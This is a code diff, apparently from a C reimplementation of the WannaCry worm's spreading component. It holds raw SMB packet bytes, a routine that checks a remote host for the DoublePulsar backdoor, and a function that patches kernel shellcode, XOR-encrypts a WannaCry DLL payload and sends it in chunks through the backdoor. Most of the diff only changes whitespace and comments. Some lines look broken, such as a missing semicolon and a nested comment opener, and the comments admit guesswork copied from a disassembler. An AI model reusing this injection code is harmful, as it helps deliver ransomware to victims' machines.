@@ -8,7 +8,6 @@
 #include "Doublepulsar_launcher_dll.h"
 #pragma comment(lib, "ws2_32.lib")
 
-//To determine if DoublePulsar is present
 unsigned char SmbNegociate[] =
 "\x00\x00\x00\x2f\xff\x53\x4d\x42\x72\x00"
 "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
@@ -40,6 +39,7 @@ unsigned char trans2_session_setup[] =
 "\x00\x0E\x00\x0D\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
 "\x00\x00"
 
+//SMB trans2 execution packet
 unsigned char wannacry_Trans2_Request[] =
 "\x00\x00\x10\x4e\xff\x53\x4d\x42\x32\x00\x00\x00\x00\x18\x07\xc0"
 "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\xff\xfe"
@@ -109,19 +109,19 @@ int IsDOUBLEPULSARInstalled(char *host, int flagUninstall, u_short hostshort)
 	userid[1] = recvbuff[33];
 	
 	//update userID in the tree connect request
-    	treeConnectRequest[32] = userid[0];
-    	treeConnectRequest[33] = userid[1];
+    treeConnectRequest[32] = userid[0];
+    treeConnectRequest[33] = userid[1];
 	send(dsock, (char*)treeConnectRequest, sizeof(treeConnectRequest) - 1, 0);
 	recv(dsock, (char*)recvbuff, sizeof(recvbuff), 0);
 	
 	//copy treeID from recvbuff @ 28, 29
-    	treeid[0] = recvbuff[28];
+    treeid[0] = recvbuff[28];
    	treeid[1] = recvbuff[29];
 	
 	trans2_session_setup[28] = treeid[0];
-        trans2_session_setup[29] = treeid[1]
-        trans2_session_setup[32] = userid[0];
-        trans2_session_setup[33] = userid[1];
+    trans2_session_setup[29] = treeid[1]
+    trans2_session_setup[32] = userid[0];
+    trans2_session_setup[33] = userid[1];
 
 	send(dsock, (char*)trans2_session_setup, sizeof(trans2_session_setup) - 1, 0);
 	recv(dsock, (char*)recvbuff, sizeof(recvbuff), 0);
@@ -144,10 +144,10 @@ int IsDOUBLEPULSARInstalled(char *host, int flagUninstall, u_short hostshort)
 		    	memcpy(trans2_session_setup + 0x32, (char*)&burn3, 1);
 		    	memcpy(trans2_session_setup + 0x33, (char*)&burn4, 1);
 		    	memcpy(trans2_session_setup + 0x34, (char*)&burn5, 1);
-			send(dsock, (char*)trans2_session_setup, sizeof(trans2_session_setup) - 1, 0);
-            		recv(dsock, (char*)uninstall_response, 1024, 0);
-			closesocket(dsock);
-			return 1;
+				send(dsock, (char*)trans2_session_setup, sizeof(trans2_session_setup) - 1, 0);
+            	recv(dsock, (char*)uninstall_response, 1024, 0);
+				closesocket(dsock);
+				return 1;
 		}
 		closesocket(dsock);
 	}
@@ -162,14 +162,12 @@ int InjectWannaCryDLLViaDoublePulsarBackdoor(SOCKET s, int architectureType, int
 	DWORD totalPayloadSize_x64 = 0xc8a4 + 0x1800 + WannacryFileSize;
 	*/
 
-
 	unsigned char byte_xor_key[5];
 	byte_xor_key[0] = (unsigned char)XorKey;
 	byte_xor_key[1] = (unsigned char)(((unsigned int)XorKey >> 8) & 0xFF);
 	byte_xor_key[2] = (unsigned char)(((unsigned int)XorKey >> 16) & 0xFF);
 	byte_xor_key[3] = (unsigned char)(((unsigned int)XorKey >> 24) & 0xFF);
 
-	
 	/*
 	/*
 	32-bit dll start address 0x40B020, size is 0x4060 bytes
@@ -199,12 +197,12 @@ int InjectWannaCryDLLViaDoublePulsarBackdoor(SOCKET s, int architectureType, int
 	
 	HGLOBAL hMem = GlobalAlloc(GMEM_ZEROINIT, shellcode_payload_size + PayloadSize + 12);
 	
-	//could be wrong but copied from IDA
-	//looks like the DLL is added to the hMem location right after the runDLL shellcode
+	//Copied from IDA
+	//DLL is added to the hMem location right after the runDLL shellcode
 	memcpy(hMem + shellcode_payload_size, Payload, PayloadSize);
 	
 	//not sure what is going on here, but looks like the total_size is getting populated here
-	/* Kept for historical purposes but most likely WRONG
+	/* Kept for historical purposes but most likely wrong
 	if (&DLLPayload[shellcode_payload_size] % 4)
 	{
 		 total_size = 4 * ((signed int)DLLPayload[shellcode_payload_size] / 4) + 4;
@@ -245,25 +243,21 @@ int InjectWannaCryDLLViaDoublePulsarBackdoor(SOCKET s, int architectureType, int
 		rundll_shellcode = &x64_kernel_shellcode;
 		
 		//shellcode must be patched in 3 areas
-		/* 1.) Kernel shellcode must be updated to include the DLL size + Userland shellcode size
-		for proper allocation in memory
-		*/
+		
+		//1.) Kernel shellcode must be updated to include the DLL size + Userland shellcode size for proper allocation in memory
 		DWORD DLL_and_UserlandShellcodeSize = 0x50D800 + 3978;
 		*(DWORD*)&x64_kernel_shellcode[0x86E] = DLL_and_UserlandShellcodeSize;
 		//0x4302CE - 0x42FA60 = 0x86E
-		//x64_kernel_shellcode[2158] = 6144+3978;
+		//x64_kernel_shellcode[2158] = 0x50D800 + 3978;
 		
 		/* Userland shellcode DLL size len */
 		/* this value was obtained from subtracting the Userland shellcode size from the Total size of the entire shellcode
 		so...if entire shellcode size is 6144 or 0x1800
-		and if userland shellcode is 3978, then kernel shellcode size is 2166
-		*/
+		and if userland shellcode size is 3978, then kernel shellcode size is 2166 */
 		*(DWORD*)&x64_kernel_shellcode[2166+0xf82] = 0x50D800;
-		//6136
 		
 		/* Userland shellcode DLL ordinal to call */
-		*(DWORD*)&x64_kernel_shellcode[2166+0xf86] = 1; //default already set to 1
-		//6140
+		*(DWORD*)&x64_kernel_shellcode[2166+0xf86] = 1; //default in the code already set to 1
 	}
 	memcpy(hMem, rundll_shellcode, shellcode_payload_size);
 	xor_payload(xkey, hMem, total_size);
@@ -301,7 +295,6 @@ int InjectWannaCryDLLViaDoublePulsarBackdoor(SOCKET s, int architectureType, int
 		hMem[i] ^= byte_xor_key[i % 4];
 	}
 
-	
 	if(total_size / 4096 > 0)
 	{
 		for(i=0; ; ctx=i)
@@ -311,6 +304,7 @@ int InjectWannaCryDLLViaDoublePulsarBackdoor(SOCKET s, int architectureType, int
 		    memcpy((unsigned char*)Parametersbuffer + 4, (unsigned char*)&ChunkSize, 4);
 		    memcpy((unsigned char*)Parametersbuffer + 8, (unsigned char*)&OffsetofChunkinPayload, 4);
 
+			//XOR the parameters
 			for (i = 0; i < 13; i++)
 			{
 				Parametersbuffer[i] ^= byte_xor_key[i % 4];
@@ -345,11 +339,11 @@ int InjectWannaCryDLLViaDoublePulsarBackdoor(SOCKET s, int architectureType, int
 		memcpy((unsigned char*)Parametersbuffer + 4, (unsigned char*)&remainder, 4);
 		memcpy((unsigned char*)Parametersbuffer + 8, (unsigned char*)&OffsetofChunkinPayload, 4);
 
+		//XOR the parameters
 		for (i = 0; i < 13; i++)
 		{
 			Parametersbuffer[i] ^= byte_xor_key[i % 4];
 		}
-		
 		
 		//size 70
 		memcpy((unsigned char*)send_buffer, (unsigned char*)wannacry_Trans2_Request, 70);
